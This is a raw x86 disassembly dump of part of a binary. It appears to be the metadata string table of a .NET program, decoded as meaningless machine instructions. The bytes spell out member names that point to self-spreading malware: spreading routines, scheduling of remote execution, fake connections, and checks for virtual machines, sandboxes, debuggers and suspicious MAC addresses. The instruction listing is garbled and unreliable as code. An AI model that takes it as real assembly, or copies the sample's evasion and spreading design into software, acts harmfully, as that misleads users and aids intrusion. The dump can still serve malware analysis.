  407129:	00 7b 08             	add    %bh,0x8(%ebx)
  40712c:	01 00                	add    %eax,(%eax)
  40712e:	00 01                	add    %al,(%ecx)
  407130:	09 00                	or     %eax,(%eax)
  407132:	08 1b                	or     %bl,(%ebx)
  407134:	01 00                	add    %eax,(%eax)
  407136:	00 01                	add    %al,(%ecx)
  407138:	0f 00 1d 0b 02 00 40 	ltr    0x4000020b
  40713f:	01 1f                	add    %ebx,(%edi)
  407141:	00 de                	add    %bl,%dh
  407143:	19 03                	sbb    %eax,(%ebx)
  407145:	00 40 01             	add    %al,0x1(%eax)
  407148:	21 00                	and    %eax,(%eax)
  40714a:	7e 1d                	jle    0x407169
  40714c:	03 00                	add    (%eax),%eax
  40714e:	40                   	inc    %eax
  40714f:	01 23                	add    %esp,(%ebx)
  407151:	00 4f 1e             	add    %cl,0x1e(%edi)
  407154:	03 00                	add    (%eax),%eax
  407156:	40                   	inc    %eax
  407157:	01 25 00 0b 06 03    	add    %esp,0x3060b00
  40715d:	00 40 01             	add    %al,0x1(%eax)
  407160:	27                   	daa
  407161:	00 8b 08 03 00 40    	add    %cl,0x40000308(%ebx)
  407167:	01 31                	add    %esi,(%ecx)
  407169:	00 36                	add    %dh,(%esi)
  40716b:	1e                   	push   %ds
  40716c:	03 00                	add    (%eax),%eax
  40716e:	00 01                	add    %al,(%ecx)
  407170:	33 00                	xor    (%eax),%eax
  407172:	1e                   	push   %ds
  407173:	1a 03                	sbb    (%ebx),%al
  407175:	00 00                	add    %al,(%eax)
  407177:	01 35 00 08 1b 03    	add    %esi,0x31b0800
  40717d:	00 00                	add    %al,(%eax)
  40717f:	01 39                	add    %edi,(%ecx)
  407181:	00 1e                	add    %bl,(%esi)
  407183:	1a 01                	sbb    (%ecx),%al
  407185:	00 00                	add    %al,(%eax)
  407187:	01 3b                	add    %edi,(%ebx)
  407189:	00 7b 08             	add    %bh,0x8(%ebx)
  40718c:	01 00                	add    %eax,(%eax)
  40718e:	00 01                	add    %al,(%ecx)
  407190:	3d 00 08 1b 01       	cmp    $0x11b0800,%eax
  407195:	00 40 01             	add    %al,0x1(%eax)
  407198:	43                   	inc    %ebx
  407199:	00 53 10             	add    %dl,0x10(%ebx)
  40719c:	04 00                	add    $0x0,%al
  40719e:	38 b5 00 00 23 00    	cmp    %dh,0x230000(%ebp)
  4071a4:	40                   	inc    %eax
  4071a5:	b5 00                	mov    $0x0,%ch
  4071a7:	00 24 00             	add    %ah,(%eax,%eax,1)
  4071aa:	04 80                	add    $0x80,%al
  4071ac:	00 00                	add    %al,(%eax)
  4071ae:	01 00                	add    %eax,(%eax)
	...
  4071bc:	78 11                	js     0x4071cf
  4071be:	00 00                	add    %al,(%eax)
  4071c0:	04 00                	add    $0x0,%al
	...
  4071ca:	00 00                	add    %al,(%eax)
  4071cc:	d5 06                	aad    $0x6
  4071ce:	14 05                	adc    $0x5,%al
  4071d0:	00 00                	add    %al,(%eax)
  4071d2:	00 00                	add    %al,(%eax)
  4071d4:	04 00                	add    $0x0,%al
	...
  4071de:	00 00                	add    %al,(%eax)
  4071e0:	d5 06                	aad    $0x6
  4071e2:	5c                   	pop    %esp
  4071e3:	11 00                	adc    %eax,(%eax)
  4071e5:	00 00                	add    %al,(%eax)
  4071e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4071f2:	00 00                	add    %al,(%eax)
  4071f4:	de 06                	fiadds (%esi)
  4071f6:	d3 1b                	rcrl   %cl,(%ebx)
  4071f8:	00 00                	add    %al,(%eax)
  4071fa:	00 00                	add    %al,(%eax)
  4071fc:	04 00                	add    $0x0,%al
	...
  407206:	00 00                	add    %al,(%eax)
  407208:	d5 06                	aad    $0x6
  40720a:	30 0b                	xor    %cl,(%ebx)
  40720c:	00 00                	add    %al,(%eax)
  40720e:	00 00                	add    %al,(%eax)
  407210:	19 00                	sbb    %eax,(%eax)
  407212:	07                   	pop    %es
  407213:	00 1a                	add    %bl,(%edx)
  407215:	00 0f                	add    %cl,(%edi)
  407217:	00 1b                	add    %bl,(%ebx)
  407219:	00 0f                	add    %cl,(%edi)
  40721b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40721e:	0f 00 1d 00 0f 00 1e 	ltr    0x1e000f00
  407225:	00 11                	add    %dl,(%ecx)
  407227:	00 1f                	add    %bl,(%edi)
  407229:	00 11                	add    %dl,(%ecx)
  40722b:	00 20                	add    %ah,(%eax)
  40722d:	00 11                	add    %dl,(%ecx)
  40722f:	00 21                	add    %ah,(%ecx)
  407231:	00 11                	add    %dl,(%ecx)
  407233:	00 22                	add    %ah,(%edx)
  407235:	00 11                	add    %dl,(%ecx)
  407237:	00 23                	add    %ah,(%ebx)
  407239:	00 11                	add    %dl,(%ecx)
  40723b:	00 24 00             	add    %ah,(%eax,%eax,1)
  40723e:	12 00                	adc    (%eax),%al
  407240:	25 00 13 00 26       	and    $0x26001300,%eax
  407245:	00 15 00 27 00 15    	add    %dl,0x15002700
  40724b:	00 28                	add    %ch,(%eax)
  40724d:	00 16                	add    %dl,(%esi)
  40724f:	00 29                	add    %ch,(%ecx)
  407251:	00 16                	add    %dl,(%esi)
  407253:	00 2a                	add    %ch,(%edx)
  407255:	00 16                	add    %dl,(%esi)
  407257:	00 2b                	add    %ch,(%ebx)
  407259:	00 18                	add    %bl,(%eax)
  40725b:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40725e:	18 00                	sbb    %al,(%eax)
  407260:	2d 00 21 00 2e       	sub    $0x2e002100,%eax
  407265:	00 26                	add    %ah,(%esi)
  407267:	00 2f                	add    %ch,(%edi)
  407269:	00 28                	add    %ch,(%eax)
  40726b:	00 f3                	add    %dh,%bl
  40726d:	00 16                	add    %dl,(%esi)
  40726f:	02 15 01 a4 02 2b    	add    0x2b02a401,%dl
  407275:	01 16                	add    %edx,(%esi)
  407277:	03 2b                	add    (%ebx),%ebp
  407279:	01 03                	add    %eax,(%ebx)
  40727b:	04 2b                	add    $0x2b,%al
  40727d:	01 69 04             	add    %ebp,0x4(%ecx)
  407280:	2b 01                	sub    (%ecx),%eax
  407282:	b6 04                	mov    $0x4,%dh
  407284:	2b 01                	sub    (%ecx),%eax
  407286:	cd 04                	int    $0x4
  407288:	2b 01                	sub    (%ecx),%eax
  40728a:	5f                   	pop    %edi
  40728b:	05 df 01 89 05       	add    $0x58901df,%eax
  407290:	df 01                	filds  (%ecx)
  407292:	d3 05 df 01 dc 05    	roll   %cl,0x5dc01df
  407298:	2b 01                	sub    (%ecx),%eax
  40729a:	eb 05                	jmp    0x4072a1
  40729c:	df 01                	filds  (%ecx)
  40729e:	34 06                	xor    $0x6,%al
  4072a0:	2b 01                	sub    (%ecx),%eax
  4072a2:	4d                   	dec    %ebp
  4072a3:	06                   	push   %es
  4072a4:	df 01                	filds  (%ecx)
  4072a6:	61                   	popa
  4072a7:	06                   	push   %es
  4072a8:	df 01                	filds  (%ecx)
  4072aa:	81 06 df 01 ad 06    	addl   $0x6ad01df,(%esi)
  4072b0:	df 01                	filds  (%ecx)
  4072b2:	cc                   	int3
  4072b3:	06                   	push   %es
  4072b4:	00 00                	add    %al,(%eax)
  4072b6:	00 00                	add    %al,(%eax)
  4072b8:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4072bb:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4072be:	44                   	inc    %esp
  4072bf:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4072c6:	6c                   	insb   (%dx),%es:(%edi)
  4072c7:	61                   	popa
  4072c8:	73 73                	jae    0x40733d
  4072ca:	31 32                	xor    %esi,(%edx)
  4072cc:	5f                   	pop    %edi
  4072cd:	30 00                	xor    %al,(%eax)
  4072cf:	3c 3e                	cmp    $0x3e,%al
  4072d1:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4072d4:	33 5f 30             	xor    0x30(%edi),%ebx
  4072d7:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  4072da:	74 61                	je     0x40733d
  4072dc:	72 74                	jb     0x407352
  4072de:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4072e2:	33 5f 30             	xor    0x30(%edi),%ebx
  4072e5:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  4072e8:	70 70                	jo     0x40735a
  4072ea:	6c                   	insb   (%dx),%es:(%edi)
  4072eb:	79 3e                	jns    0x40732b
  4072ed:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4072f0:	33 5f 30             	xor    0x30(%edi),%ebx
  4072f3:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4072f6:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4072f9:	44                   	inc    %esp
  4072fa:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407301:	6c                   	insb   (%dx),%es:(%edi)
  407302:	61                   	popa
  407303:	73 73                	jae    0x407378
  407305:	33 5f 30             	xor    0x30(%edi),%ebx
  407308:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40730b:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  40730e:	34 5f                	xor    $0x5f,%al
  407310:	30 00                	xor    %al,(%eax)
  407312:	3c 53                	cmp    $0x53,%al
  407314:	74 61                	je     0x407377
  407316:	72 74                	jb     0x40738c
  407318:	53                   	push   %ebx
  407319:	70 72                	jo     0x40738d
  40731b:	65 61                	gs popa
  40731d:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  407324:	5f 
  407325:	34 5f                	xor    $0x5f,%al
  407327:	30 00                	xor    %al,(%eax)
  407329:	3c 3e                	cmp    $0x3e,%al
  40732b:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40732e:	44                   	inc    %esp
  40732f:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407336:	6c                   	insb   (%dx),%es:(%edi)
  407337:	61                   	popa
  407338:	73 73                	jae    0x4073ad
  40733a:	31 36                	xor    %esi,(%esi)
  40733c:	5f                   	pop    %edi
  40733d:	30 00                	xor    %al,(%eax)
  40733f:	3c 3e                	cmp    $0x3e,%al
  407341:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407344:	44                   	inc    %esp
  407345:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40734c:	6c                   	insb   (%dx),%es:(%edi)
  40734d:	61                   	popa
  40734e:	73 73                	jae    0x4073c3
  407350:	36 5f                	ss pop %edi
  407352:	30 00                	xor    %al,(%eax)
  407354:	3c 3e                	cmp    $0x3e,%al
  407356:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407359:	44                   	inc    %esp
  40735a:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407361:	6c                   	insb   (%dx),%es:(%edi)
  407362:	61                   	popa
  407363:	73 73                	jae    0x4073d8
  407365:	37                   	aaa
  407366:	5f                   	pop    %edi
  407367:	30 00                	xor    %al,(%eax)
  407369:	3c 3e                	cmp    $0x3e,%al
  40736b:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  40736e:	38 5f 30             	cmp    %bl,0x30(%edi)
  407371:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  407374:	70 72                	jo     0x4073e8
  407376:	65 61                	gs popa
  407378:	64 41                	fs inc %ecx
  40737a:	73 79                	jae    0x4073f5
  40737c:	6e                   	outsb  %ds:(%esi),(%dx)
  40737d:	63 3e                	arpl   %edi,(%esi)
  40737f:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  407382:	38 5f 30             	cmp    %bl,0x30(%edi)
  407385:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407388:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40738b:	44                   	inc    %esp
  40738c:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  407393:	6c                   	insb   (%dx),%es:(%edi)
  407394:	61                   	popa
  407395:	73 73                	jae    0x40740a
  407397:	38 5f 30             	cmp    %bl,0x30(%edi)
  40739a:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40739d:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4073a0:	44                   	inc    %esp
  4073a1:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4073a8:	6c                   	insb   (%dx),%es:(%edi)
  4073a9:	61                   	popa
  4073aa:	73 73                	jae    0x40741f
  4073ac:	39 5f 30             	cmp    %ebx,0x30(%edi)
  4073af:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4073b2:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  4073b5:	30 00                	xor    %al,(%eax)
  4073b7:	3c 49                	cmp    $0x49,%al
  4073b9:	73 52                	jae    0x40740d
  4073bb:	75 6e                	jne    0x40742b
  4073bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4073be:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  4073c5:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4073c9:	30 00                	xor    %al,(%eax)
  4073cb:	3c 53                	cmp    $0x53,%al
  4073cd:	70 72                	jo     0x407441
  4073cf:	65 61                	gs popa
  4073d1:	64 4f                	fs dec %edi
  4073d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4073d4:	63 65 41             	arpl   %esp,0x41(%ebp)
  4073d7:	73 79                	jae    0x407452
  4073d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4073da:	63 3e                	arpl   %edi,(%esi)
  4073dc:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4073df:	30 00                	xor    %al,(%eax)
  4073e1:	3c 54                	cmp    $0x54,%al
  4073e3:	72 79                	jb     0x40745e
  4073e5:	53                   	push   %ebx
  4073e6:	63 68 65             	arpl   %ebp,0x65(%eax)
  4073e9:	64 75 6c             	fs jne 0x407458
  4073ec:	65 52                	gs push %edx
  4073ee:	65 6d                	gs insl (%dx),%es:(%edi)
  4073f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4073f1:	74 65                	je     0x407458
  4073f3:	45                   	inc    %ebp
  4073f4:	78 65                	js     0x40745b
  4073f6:	63 75 74             	arpl   %esi,0x74(%ebp)
  4073f9:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  407400:	63 3e                	arpl   %edi,(%esi)
  407402:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  407405:	30 00                	xor    %al,(%eax)
  407407:	3c 49                	cmp    $0x49,%al
  407409:	73 53                	jae    0x40745e
  40740b:	61                   	popa
  40740c:	6e                   	outsb  %ds:(%esi),(%dx)
  40740d:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407411:	53                   	push   %ebx
  407412:	65 72 76             	gs jb  0x40748b
  407415:	69 63 65 52 75 6e 6e 	imul   $0x6e6e7552,0x65(%ebx),%esp
  40741c:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  407423:	30 00                	xor    %al,(%eax)
  407425:	3c 49                	cmp    $0x49,%al
  407427:	73 44                	jae    0x40746d
  407429:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40742d:	67 65 72 50          	addr16 gs jb 0x407481
  407431:	72 6f                	jb     0x4074a2
  407433:	63 65 73             	arpl   %esp,0x73(%ebp)
  407436:	73 52                	jae    0x40748a
  407438:	75 6e                	jne    0x4074a8
  40743a:	6e                   	outsb  %ds:(%esi),(%dx)
  40743b:	69 6e 67 3e 62 5f 5f 	imul   $0x5f5f623e,0x67(%esi),%ebp
  407442:	30 00                	xor    %al,(%eax)
  407444:	3c 53                	cmp    $0x53,%al
  407446:	70 69                	jo     0x4074b1
  407448:	6b 65 4c 6f          	imul   $0x6f,0x4c(%ebp),%esp
  40744c:	6f                   	outsl  %ds:(%esi),(%dx)
  40744d:	70 3e                	jo     0x40748d
  40744f:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  407452:	30 00                	xor    %al,(%eax)
  407454:	3c 48                	cmp    $0x48,%al
  407456:	61                   	popa
  407457:	73 53                	jae    0x4074ac
  407459:	75 73                	jne    0x4074ce
  40745b:	70 69                	jo     0x4074c6
  40745d:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  407460:	75 73                	jne    0x4074d5
  407462:	4d                   	dec    %ebp
  407463:	61                   	popa
  407464:	63 41 64             	arpl   %eax,0x64(%ecx)
  407467:	64 72 65             	fs jb  0x4074cf
  40746a:	73 73                	jae    0x4074df
  40746c:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  407470:	30 00                	xor    %al,(%eax)
  407472:	3c 3e                	cmp    $0x3e,%al
  407474:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  407477:	44                   	inc    %esp
  407478:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40747f:	6c                   	insb   (%dx),%es:(%edi)
  407480:	61                   	popa
  407481:	73 73                	jae    0x4074f6
  407483:	38 5f 31             	cmp    %bl,0x31(%edi)
  407486:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407489:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  40748c:	31 00                	xor    %eax,(%eax)
  40748e:	3c 49                	cmp    $0x49,%al
  407490:	73 52                	jae    0x4074e4
  407492:	75 6e                	jne    0x407502
  407494:	6e                   	outsb  %ds:(%esi),(%dx)
  407495:	69 6e 67 49 6e 56 4d 	imul   $0x4d566e49,0x67(%esi),%ebp
  40749c:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4074a0:	31 00                	xor    %eax,(%eax)
  4074a2:	3c 53                	cmp    $0x53,%al
  4074a4:	70 72                	jo     0x407518
  4074a6:	65 61                	gs popa
  4074a8:	64 41                	fs inc %ecx
  4074aa:	73 79                	jae    0x407525
  4074ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ad:	63 3e                	arpl   %edi,(%esi)
  4074af:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4074b2:	31 00                	xor    %eax,(%eax)
  4074b4:	3c 48                	cmp    $0x48,%al
  4074b6:	61                   	popa
  4074b7:	73 53                	jae    0x40750c
  4074b9:	75 73                	jne    0x40752e
  4074bb:	70 69                	jo     0x407526
  4074bd:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  4074c0:	75 73                	jne    0x407535
  4074c2:	4d                   	dec    %ebp
  4074c3:	61                   	popa
  4074c4:	63 41 64             	arpl   %eax,0x64(%ecx)
  4074c7:	64 72 65             	fs jb  0x40752f
  4074ca:	73 73                	jae    0x40753f
  4074cc:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4074d0:	31 00                	xor    %eax,(%eax)
  4074d2:	3c 4d                	cmp    $0x4d,%al
  4074d4:	61                   	popa
  4074d5:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  4074dc:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4074df:	75 5f                	jne    0x407540
  4074e1:	5f                   	pop    %edi
  4074e2:	31 00                	xor    %eax,(%eax)
  4074e4:	46                   	inc    %esi
  4074e5:	75 6e                	jne    0x407555
  4074e7:	63 60 31             	arpl   %esp,0x31(%eax)
  4074ea:	00 49 45             	add    %cl,0x45(%ecx)
  4074ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4074ee:	75 6d                	jne    0x40755d
  4074f0:	65 72 61             	gs jb  0x407554
  4074f3:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  4074f7:	31 00                	xor    %eax,(%eax)
  4074f9:	54                   	push   %esp
  4074fa:	61                   	popa
  4074fb:	73 6b                	jae    0x407568
  4074fd:	60                   	pusha
  4074fe:	31 00                	xor    %eax,(%eax)
  407500:	54                   	push   %esp
  407501:	61                   	popa
  407502:	73 6b                	jae    0x40756f
  407504:	41                   	inc    %ecx
  407505:	77 61                	ja     0x407568
  407507:	69 74 65 72 60 31 00 	imul   $0x4c003160,0x72(%ebp,%eiz,2),%esi
  40750e:	4c 
  40750f:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  407516:	61                   	popa
  407517:	74 68                	je     0x407581
  407519:	31 00                	xor    %eax,(%eax)
  40751b:	3c 3e                	cmp    $0x3e,%al
  40751d:	37                   	aaa
  40751e:	5f                   	pop    %edi
  40751f:	5f                   	pop    %edi
  407520:	77 72                	ja     0x407594
  407522:	61                   	popa
  407523:	70 31                	jo     0x407556
  407525:	00 43 53             	add    %al,0x53(%ebx)
  407528:	24 3c                	and    $0x3c,%al
  40752a:	3e 38 5f 5f          	cmp    %bl,%ds:0x5f(%edi)
  40752e:	6c                   	insb   (%dx),%es:(%edi)
  40752f:	6f                   	outsl  %ds:(%esi),(%dx)
  407530:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407533:	73 31                	jae    0x407566
  407535:	00 5f 5f             	add    %bl,0x5f(%edi)
  407538:	53                   	push   %ebx
  407539:	74 61                	je     0x40759c
  40753b:	74 69                	je     0x4075a6
  40753d:	63 41 72             	arpl   %eax,0x72(%ecx)
  407540:	72 61                	jb     0x4075a3
  407542:	79 49                	jns    0x40758d
  407544:	6e                   	outsb  %ds:(%esi),(%dx)
  407545:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40754c:	69 
  40754d:	7a 65                	jp     0x4075b4
  40754f:	3d 31 32 32 00       	cmp    $0x323231,%eax
  407554:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  407558:	65 6c                	gs insb (%dx),%es:(%edi)
  40755a:	33 32                	xor    (%edx),%esi
  40755c:	00 4d 69             	add    %cl,0x69(%ebp)
  40755f:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407562:	73 6f                	jae    0x4075d3
  407564:	66 74 2e             	data16 je 0x407595
  407567:	57                   	push   %edi
  407568:	69 6e 33 32 00 55 49 	imul   $0x49550032,0x33(%esi),%ebp
  40756f:	6e                   	outsb  %ds:(%esi),(%dx)
  407570:	74 33                	je     0x4075a5
  407572:	32 00                	xor    (%eax),%al
  407574:	54                   	push   %esp
  407575:	6f                   	outsl  %ds:(%esi),(%dx)
  407576:	49                   	dec    %ecx
  407577:	6e                   	outsb  %ds:(%esi),(%dx)
  407578:	74 33                	je     0x4075ad
  40757a:	32 00                	xor    (%eax),%al
  40757c:	3c 73                	cmp    $0x73,%al
  40757e:	6c                   	insb   (%dx),%es:(%edi)
  40757f:	6f                   	outsl  %ds:(%esi),(%dx)
  407580:	77 45                	ja     0x4075c7
  407582:	6e                   	outsb  %ds:(%esi),(%dx)
  407583:	64 3e 35 5f 5f 32 00 	fs ds xor $0x325f5f,%eax
  40758a:	3c 62                	cmp    $0x62,%al
  40758c:	61                   	popa
  40758d:	73 65                	jae    0x4075f4
  40758f:	49                   	dec    %ecx
  407590:	70 3e                	jo     0x4075d0
  407592:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  407597:	3c 63                	cmp    $0x63,%al
  407599:	6c                   	insb   (%dx),%es:(%edi)
  40759a:	69 65 6e 74 3e 35 5f 	imul   $0x5f353e74,0x6e(%ebp),%esp
  4075a1:	5f                   	pop    %edi
  4075a2:	32 00                	xor    (%eax),%al
  4075a4:	3c 3e                	cmp    $0x3e,%al
  4075a6:	38 5f 5f             	cmp    %bl,0x5f(%edi)
  4075a9:	32 00                	xor    (%eax),%al
  4075ab:	46                   	inc    %esi
  4075ac:	75 6e                	jne    0x40761c
  4075ae:	63 60 32             	arpl   %esp,0x32(%eax)
  4075b1:	00 70 61             	add    %dh,0x61(%eax)
  4075b4:	74 68                	je     0x40761e
  4075b6:	32 00                	xor    (%eax),%al
  4075b8:	3c 3e                	cmp    $0x3e,%al
  4075ba:	37                   	aaa
  4075bb:	5f                   	pop    %edi
  4075bc:	5f                   	pop    %edi
  4075bd:	77 72                	ja     0x407631
  4075bf:	61                   	popa
  4075c0:	70 32                	jo     0x4075f4
  4075c2:	00 5f 5f             	add    %bl,0x5f(%edi)
  4075c5:	53                   	push   %ebx
  4075c6:	74 61                	je     0x407629
  4075c8:	74 69                	je     0x407633
  4075ca:	63 41 72             	arpl   %eax,0x72(%ecx)
  4075cd:	72 61                	jb     0x407630
  4075cf:	79 49                	jns    0x40761a
  4075d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4075d2:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4075d9:	69 
  4075da:	7a 65                	jp     0x407641
  4075dc:	3d 33 00 3c 63       	cmp    $0x633c0033,%eax
  4075e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e4:	65 63 74 54 61       	arpl   %esi,%gs:0x61(%esp,%edx,2)
  4075e9:	73 6b                	jae    0x407656
  4075eb:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  4075f1:	3c 74                	cmp    $0x74,%al
  4075f3:	61                   	popa
  4075f4:	73 6b                	jae    0x407661
  4075f6:	73 3e                	jae    0x407636
  4075f8:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  4075fd:	3c 3e                	cmp    $0x3e,%al
  4075ff:	37                   	aaa
  407600:	5f                   	pop    %edi
  407601:	5f                   	pop    %edi
  407602:	77 72                	ja     0x407676
  407604:	61                   	popa
  407605:	70 33                	jo     0x40763a
  407607:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  40760b:	49                   	dec    %ecx
  40760c:	6e                   	outsb  %ds:(%esi),(%dx)
  40760d:	74 36                	je     0x407645
  40760f:	34 00                	xor    $0x0,%al
  407611:	3c 69                	cmp    $0x69,%al
  407613:	3e 35 5f 5f 34 00    	ds xor $0x345f5f,%eax
  407619:	3c 3e                	cmp    $0x3e,%al
  40761b:	37                   	aaa
  40761c:	5f                   	pop    %edi
  40761d:	5f                   	pop    %edi
  40761e:	77 72                	ja     0x407692
  407620:	61                   	popa
  407621:	70 34                	jo     0x407657
  407623:	00 3c 4f             	add    %bh,(%edi,%ecx,2)
  407626:	70 65                	jo     0x40768d
  407628:	6e                   	outsb  %ds:(%esi),(%dx)
  407629:	46                   	inc    %esi
  40762a:	61                   	popa
  40762b:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  40762f:	6e                   	outsb  %ds:(%esi),(%dx)
  407630:	6e                   	outsb  %ds:(%esi),(%dx)
  407631:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407636:	6e                   	outsb  %ds:(%esi),(%dx)
  407637:	41                   	inc    %ecx
  407638:	73 79                	jae    0x4076b3
  40763a:	6e                   	outsb  %ds:(%esi),(%dx)
  40763b:	63 3e                	arpl   %edi,(%esi)
  40763d:	64 5f                	fs pop %edi
  40763f:	5f                   	pop    %edi
  407640:	35 00 3c 54 72       	xor    $0x72543c00,%eax
  407645:	79 53                	jns    0x40769a
  407647:	63 68 65             	arpl   %ebp,0x65(%eax)
  40764a:	64 75 6c             	fs jne 0x4076b9
  40764d:	65 52                	gs push %edx
  40764f:	65 6d                	gs insl (%dx),%es:(%edi)
  407651:	6f                   	outsl  %ds:(%esi),(%dx)
  407652:	74 65                	je     0x4076b9
  407654:	45                   	inc    %ebp
  407655:	78 65                	js     0x4076bc
  407657:	63 75 74             	arpl   %esi,0x74(%ebp)
  40765a:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  407661:	63 3e                	arpl   %edi,(%esi)
  407663:	64 5f                	fs pop %edi
  407665:	5f                   	pop    %edi
  407666:	31 36                	xor    %esi,(%esi)
  407668:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  40766b:	70 72                	jo     0x4076df
  40766d:	65 61                	gs popa
  40766f:	64 4f                	fs dec %edi
  407671:	6e                   	outsb  %ds:(%esi),(%dx)
  407672:	63 65 41             	arpl   %esp,0x41(%ebp)
  407675:	73 79                	jae    0x4076f0
  407677:	6e                   	outsb  %ds:(%esi),(%dx)
  407678:	63 3e                	arpl   %edi,(%esi)
  40767a:	64 5f                	fs pop %edi
  40767c:	5f                   	pop    %edi
  40767d:	36 00 67 65          	add    %ah,%ss:0x65(%edi)
  407681:	74 5f                	je     0x4076e2
  407683:	55                   	push   %ebp
  407684:	54                   	push   %esp
  407685:	46                   	inc    %esi
  407686:	38 00                	cmp    %al,(%eax)
  407688:	3c 53                	cmp    $0x53,%al
  40768a:	70 72                	jo     0x4076fe
  40768c:	65 61                	gs popa
  40768e:	64 41                	fs inc %ecx
  407690:	73 79                	jae    0x40770b
  407692:	6e                   	outsb  %ds:(%esi),(%dx)
  407693:	63 3e                	arpl   %edi,(%esi)
  407695:	64 5f                	fs pop %edi
  407697:	5f                   	pop    %edi
  407698:	38 00                	cmp    %al,(%eax)
  40769a:	39 37                	cmp    %esi,(%edi)
  40769c:	32 30                	xor    (%eax),%dh
  40769e:	32 46 30             	xor    0x30(%esi),%al
  4076a1:	46                   	inc    %esi
  4076a2:	42                   	inc    %edx
  4076a3:	43                   	inc    %ebx
  4076a4:	43                   	inc    %ebx
  4076a5:	38 44 45 35          	cmp    %al,0x35(%ebp,%eax,2)
  4076a9:	43                   	inc    %ebx
  4076aa:	43                   	inc    %ebx
  4076ab:	33 43 30             	xor    0x30(%ebx),%eax
  4076ae:	35 37 37 44 41       	xor    $0x41443737,%eax
  4076b3:	42                   	inc    %edx
  4076b4:	44                   	inc    %esp
  4076b5:	34 41                	xor    $0x41,%al
  4076b7:	45                   	inc    %ebp
  4076b8:	38 34 30             	cmp    %dh,(%eax,%esi,1)
  4076bb:	39 33                	cmp    %esi,(%ebx)
